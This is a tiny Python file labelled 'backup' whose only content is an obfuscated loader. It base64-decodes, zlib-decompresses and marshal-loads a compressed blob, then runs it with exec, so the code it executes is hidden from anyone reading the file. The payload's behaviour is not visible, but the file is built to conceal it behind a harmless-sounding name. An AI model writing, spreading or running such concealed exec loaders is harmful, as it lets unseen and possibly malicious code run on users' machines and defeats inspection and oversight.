# backup
idk

import base64, zlib, marshal

code = b'eNqNk8Fq2zAQhf+K+ZJKnYYNjbVWggKNpWbbgSkKQlIJChKVUePLvddZmS+aNey93mTmH/L6Zx2UyWiU95yQG1SWEMqBGLFLjepKkAmGmU5KkWrpgAxSh7xv9I72gihkMvz3c9W6sJjA2h+RkQYAlm6dx1X+W0HdYTfbjQo3S9ZjW1BgspCB69sbOsFZCnpB+Hsq4RXhW7ej3+zmWknU0Ik4I6jHRZ+ykpZ/CgeUks6DWb+cK1HxjVihg+K9qjR+8M32lMcYz2a9RMPZ6DND6RxPN+egzivJZVXMcwKa0UC2YcJzrsOAxRYcqxHivpyJW0j1f+G5uKNbNuA9V1V+p/NnXRddm23uq+a5Xs43Xotznn7fD5UO3Huvz/NzMX2vT0I2phj9bMe3Eolcyuop0w5FJUTpBNux2erUlb7QO6vgcf5KxwS3gH8NeH8efqPfb8fw0xDi4='

exec(marshal.loads(zlib.decompress(base64.b64decode(code))))
